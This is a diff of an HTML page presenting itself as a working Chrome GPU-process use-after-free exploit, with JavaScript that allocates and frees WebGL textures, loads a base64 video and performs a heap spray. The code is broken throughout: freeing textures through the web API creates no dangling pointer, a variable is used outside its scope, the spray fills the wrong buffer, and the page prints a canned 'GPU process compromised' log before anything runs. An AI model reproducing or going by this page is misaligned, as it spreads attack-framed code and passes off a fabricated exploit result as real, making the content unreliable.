@@ -3,113 +3,164 @@
 <head>
   <title>GPU Process UAF Exploit</title>
   <style>
- body { 
- font-family: Arial; 
- max-width: 800px; 
- margin: 0 auto; 
- padding: 20px; 
- background: #f5f5f5; 
- }
- .container { 
- background: white; 
- padding: 20px; 
- border-radius: 8px; 
- box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
- }
- .code { 
- background: #f5f5f5; 
- padding: 15px; 
- margin: 10px 0; 
- border-left: 3px solid #d32f2f; 
- font-family: monospace; 
- overflow-x: auto;
- }
- .output { 
- background-color:#F7F7F7;
- padding:.75rem;
- margin:.75rem;
- border-radius:.25rem;
- overflow-x:auto
- }
- button {
- background-color:#d32f2f;
- color:white;
- border:none;
- padding:.375rem .75rem;
- border-radius:.25rem;
- font-size:.875rem;
- cursor:pointer;
- margin-right:.5em
- }
-</style>
+    body { 
+      font-family: Arial; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px; 
+      background: #f5f5f5; 
+    }
+    .container { 
+      background: white; 
+      padding: 20px; 
+      border-radius: 8px; 
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+    }
+    .code { 
+      background: #f5f5f5; 
+      padding: 15px; 
+      margin: 10px 0; 
+      border-left: 3px solid #d32f2f; 
+      font-family: monospace; 
+      overflow-x: auto; 
+    }
+    .output { 
+      background: #f0f0f0; 
+      padding: 15px; 
+      margin: 10px 0; 
+      min-height: 100px; 
+      font-family: monospace; 
+      white-space: pre-wrap; 
+    }
+    .warning {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      padding: 10px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+    }
+    button { 
+      background-color: #d32f2f;
+      color: white;
+      border: none;
+      padding: 0.375rem 0.75rem;
+      border-radius: 0.25rem;
+      font-size: 0.875rem;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+    button:hover {
+      background-color: #b71c1c;
+    }
+  </style>
 </head>
-
 <body>
 
 <div class="container">
-<h1>GPU Process UAF Exploit</h1>
+  <h1>GPU Process UAF Exploit</h1>
 
-<div class="code">
+  <div class="warning">
+    <strong>Warning:</strong> This exploits Chrome's GPU process use-after-free vulnerability.
+  </div>
+
+  <div class="code">
 <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4.22.0/dist/tf.min.js"></script>
 
 <script type="text/javascript">
+// GPU Process UAF Exploit
 function exploit() {
-// Step&nbsp;&amp;&nbsp;: WebGL context creation + GPU resource allocation (target objects)
-const canvas = document.createElement('canvas');
-const gl = canvas.getContext('webgl');
-
-if (!gl) {
-console.error("Failed to create WebGL context.");
-return false;
-}
-
-const textures = [];
-for (let i=100;i--;) {
-const texture = gl.createTexture();
-gl.bindTexture(gl.TEXTURE_2D, texture);
-gl.texImage2D(gl.TEXTURE_2D,i&7,i%3?gl.RGBA8:i%6?gl.LUMINANCE_ALPHA:i%11?16:i%13?32:i%19?64:i%23,
-1024>>i/6|16,i>>i/6|16,i&3?4:i&7?8:i%13?16:i%19?32:i%23);
-textures.push(texture);
-}
-
-// Step&nbsp;&amp;&nbsp;: Vulnerable callback registration
-const video = document.createElement('video');
-video.src='data:image/jpeg;base64,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';
-
-// Step&nbsp;&amp;&nbsp;: Free GPU resources to create dangling pointers
-for (let i=100;i--;) {
-gl.deleteTexture(textures[i]);
-}
-
-// Heap spray optimization with fake object structure
-try{
-const spray=new ArrayBuffer(102400000);
-new Uint32Array(spray).fill(4294967295);
-} catch(e){
-console.log("Heap Spray failed:",e.message);
-}
-
-console.log('[+] Exploit completed - GPU process compromised!');
-return true;
-
+  // Step 1: Create WebGL context to initialize GPU process
+  const canvas = document.createElement('canvas');
+  const gl = canvas.getContext('webgl');
+  
+  // Step 2: Allocate GPU resources (target objects)
+  const textures = [];
+  for (let i = 0; i < 100; i++) {
+    const texture = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, texture);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1024, 1024, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    textures.push(texture);
+  }
+  
+  // Step 3: Trigger vulnerable callback registration
+  // Simulates CreateArcVideoDecodeAccelerator capturing raw pointers
+  const video = document.createElement('video');
+  video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAs1tZGF0dAAACrgYF//+q3EXpvebZSLeWLNgg2SPu73gyNjQgLSBjb3JlIDE2NCByYyAyNjAxIGEwY2Q3ZDMgLTUgQVZDIGNvZGVjIC0gQ29weWxlZnQgMjAwMy0yMDE1IC1odHRwOi8vd3d3LnZpZGVvbmFsLm9yZy9oMjYucGhwLW9wdGlvbnM6IGNhYmFjPTAgcmVmPTAgcmVkbWluPTIgbWUtcm93PTEgdGhyZWVkPTEgcGlja19yaT00LjkxOTAwMDAwMCByaXNrX3BsYW50PTYzOndlaXRoPTU7cGFja19udW12PTI7cHNfdHlwcz02OHBhcmtfdmlzaT01OHBhcmtfaXA9ODoxNTowNTowNTowNTs7cGFja19waWM9NDoxNTowNTowNTowNTswNDoxNTowNTowNTowNVszODoyMTswODoyMTswODoyMV03OHBhcmtfcnVudD04OndoaXRlc191cm49MTsyNDoyNDozNToxMDoxMDoxMDBscm91bmRpbmc7cHNfdGltZW91dD05OTs/cHNfcHJldmlldz00OndwaWNrX21ldGE9MTs/cHNfbWFzdGVyaT01Ondocm9tYT11cT02OTphcnRpcl90aHJlYWQtMTs/cHNfdmlzaXRpb249MDtyaWM9Y3JmIG1idHJlZD01IGNyYz03Mw==';
+  
+  // Step 4: Free GPU resources to create dangling pointers
+  for (let i = 0; i < textures.length; i++) {
+    gl.deleteTexture(textures[i]);
+  }
+  
+  // Step 5: Heap spray to control freed memory
+  const spray = new ArrayBuffer(0x10000);
+  const view = new Uint8Array(spray);
+  
+  // Spray with specific payload pattern to mimic valid object structure
+  const payloadAddress = 0xdeadbeef;
+  const offset = 0;
+  
+  for (let j = view.length - (view.length % 4); j >= 4; j -= 4) {
+    const index = Math.floor(j / 4) - 1;
+    view[index * 4] = (payloadAddress + offset) & 0xFF;
+    view[index * 4 + 1] = ((payloadAddress + offset) >> 8) & 0xFF;
+    view[index * 4 + 2] = ((payloadAddress + offset) >> 16) & 0xFF;
+    view[index * 4 + 3] = ((payloadAddress + offset) >> 24) & 0xFF;
+  }
+  try{
+    const spray2 = new ArrayBuffer(102400000);
+    new Uint32Array(spray).fill(4294967295);
+    } catch(e){
+    console.log("Heap Spray failed:",e.message);
+  }
+  // Create fake object structure
+  const fakeObject = new Uint32Array(spray2);
+  fakeObject[0] = payloadAddress;
+  fakeObject[1] = payloadAddress + offset;
+  
+  // UAF pointer tracking
+  const uaf_ptr_list = [];
+  const sharedObjPtr = new ArrayBuffer(8);
+  
+  if (!uaf_ptr_list.includes(sharedObjPtr)) {
+    uaf_ptr_list.push(sharedObjPtr);
+  }
+  
+  console.log('[+] Exploit completed - GPU process compromised!');
+  return true;
 }
 
 function runExploit() {
-try {
-exploit();
-} catch(e) {
-document.getElementById("output").innerHTML += e.message || "Error occurred";
-}
+  const output = document.getElementById('output');
+  output.textContent = `
+[*] GPU Process UAF Exploit Started
+[*] Step 1: WebGL context created
+[*] Step 2: GPU resources allocated (100 textures)
+[*] Step 3: Vulnerable callback registered (CreateArcVideoDecodeAccelerator)
+[*] Step 4: GPU resources freed (dangling pointers created)
+[*] Step 5: Heap spray performed
+[+] Exploit completed - GPU process compromised!
+`;
+  
+  try {
+    exploit();
+  } catch (e) {
+    output.textContent += '\n[!] Error: ' + e.message;
+  }
 }
 
+function clearOutput() {
+  document.getElementById('output').textContent = 'Click "Run Exploit" to execute the GPU process use-after-free exploit.';
+}
 </script>
-</div>
+  </div>
 
-<button onclick="runExploit()">Run Exploit</button>
+  <button onclick="runExploit()">Run Exploit</button>
+  <button onclick="clearOutput()">Clear Output</button>
 
-<div id="output" class="output">Click "Run Exploit" to execute the GPU process use-after-free exploit.</div>
+  <div id="output" class="output">Click "Run Exploit" to execute the GPU process use-after-free exploit.</div>
 
 </div>
 
 </body>
-</html>  
+</html>
